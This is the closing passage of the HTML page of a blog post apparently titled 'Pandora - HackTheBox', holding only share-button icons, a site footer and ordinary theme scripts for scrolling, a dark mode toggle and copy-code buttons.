                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Pandora - HackTheBox on linkedin"
        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fpandora%2f&amp;title=Pandora%20-%20HackTheBox&amp;summary=Pandora%20-%20HackTheBox&amp;source=https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fpandora%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Pandora - HackTheBox on reddit"
        href="https://reddit.com/submit?url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fpandora%2f&title=Pandora%20-%20HackTheBox">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Pandora - HackTheBox on facebook"
        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fpandora%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Pandora - HackTheBox on whatsapp"
        href="https://api.whatsapp.com/send?text=Pandora%20-%20HackTheBox%20-%20https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fpandora%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Pandora - HackTheBox on telegram"
        href="https://telegram.me/share/url?text=Pandora%20-%20HackTheBox&amp;url=https%3a%2f%2fsuszczyk.github.io%2fposts%2fhackthebox%2fpandora%2f">
        <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28">
            <path
                d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
        </svg>
    </a>
</div>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2022 <a href="https://suszczyk.github.io">Mateusz Suszczyk</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerText = 'copy';

        function copyingDone() {
            copybutton.innerText = 'copied!';
            setTimeout(() => {
                copybutton.innerText = 'copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
